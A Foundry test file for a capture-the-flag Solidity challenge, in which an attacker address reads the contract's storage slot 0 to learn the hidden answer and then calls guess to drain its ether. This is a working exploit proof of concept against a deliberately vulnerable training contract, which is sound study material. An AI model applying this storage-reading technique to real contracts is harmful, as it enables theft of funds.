// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {GuessTheRandomNumberChallenge} from "../../src/random/GuessTheRandomNumberChallenge.sol";

contract GuessTheRandomNumberChallengeTest is Test {

    GuessTheRandomNumberChallenge guestNemberChallenge;
    address attacker = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);


    function setUp() public {
        vm.deal(attacker, 1 ether);
        guestNemberChallenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function testGuessAttack() public {
        // read slot 0
        bytes32 slot0 = vm.load(address(guestNemberChallenge), bytes32(uint256(0)));

        // same conversion of contract
        uint8 answer = uint8(uint256(slot0));

        vm.prank(attacker);
        guestNemberChallenge.guess{value: 1 ether}(answer);

        // attacker balance
        assertEq(attacker.balance, 2 ether);

        // contract balance
        assertEq(address(guestNemberChallenge).balance, 0);
    }
}